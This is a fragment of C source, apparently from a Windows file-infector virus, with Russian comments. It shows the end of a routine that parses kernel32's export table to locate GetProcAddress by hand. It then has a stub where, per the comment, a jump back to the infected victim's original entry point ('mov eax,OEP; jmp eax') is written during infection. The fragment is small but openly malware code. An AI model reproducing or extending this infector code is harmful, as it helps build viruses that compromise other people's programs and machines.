	DWORD ret=pAddrOfFunc[ordinal];
	return (LPVOID)RVATOVA(hModule,ret);
/**********************************************************************************************
								END РАЗБОР ТАБЛИЦЫ ЭКСПОРТА В КЕРНЕЛ32
**********************************************************************************************/
}
/**********************************************************************************************
*																							  *
*	Конец функции GetGetProcAddress															  *
*																							  *
**********************************************************************************************/



//сюда при инфектах будет записан переход на жертву:
//mov	eax,OEP
//jmp	eax
fnEnd(){}
